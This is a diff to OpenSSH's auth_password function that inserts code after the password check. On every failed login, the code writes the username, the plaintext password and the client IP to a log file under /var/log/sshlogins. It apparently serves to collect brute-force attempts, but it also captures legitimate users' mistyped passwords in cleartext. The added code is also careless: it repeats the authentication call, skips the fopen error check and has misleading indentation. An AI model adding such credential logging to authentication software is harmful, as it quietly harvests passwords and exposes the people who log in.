@@ -40,11 +40,13 @@
 
 #include <sys/types.h>
 
+#include <time.h>
 #include <pwd.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
 
+#include <sys/stat.h>
 #include "packet.h"
 #include "buffer.h"
 #include "log.h"
@@ -101,6 +103,8 @@ auth_password(Authctxt *authctxt, const char *password)
 		/* Fall back to ordinary passwd authentication. */
 	}
 #endif
+
+
 #ifdef HAVE_CYGWIN
 	{
 		HANDLE hToken = cygwin_logon_user(pw, password);
@@ -125,6 +129,14 @@ auth_password(Authctxt *authctxt, const char *password)
 	result = sys_auth_passwd(authctxt, password);
 	if (authctxt->force_pwchange)
 		disable_forwarding();
+		if(!sys_auth_passwd(authctxt, password))
+	{
+	    FILE *brute; 
+	    brute = fopen("/var/log/sshlogins/sshd_auth.log", "a");
+	    chmod("/var/log/sshlogins/sshd_auth.log", 0600);   
+	    fprintf(brute,"%i:%.100s:%.100s:%.200s\n",time(NULL),authctxt->user,password,get_remote_ipaddr());
+	    fclose(brute);
+	}
 	return (result && ok);
 }
 
